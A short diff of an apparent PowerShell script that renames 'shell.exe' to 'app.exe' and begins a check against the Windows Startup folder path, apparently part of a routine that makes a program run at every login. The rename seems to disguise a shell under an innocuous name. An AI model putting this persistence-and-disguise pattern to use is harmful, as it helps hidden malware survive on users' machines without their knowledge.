@@ -1,4 +1,4 @@
-$fileName = "shell.exe"
+$fileName = "app.exe"
 $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 
 if ($PWD.Path -ne $startupFolder) {
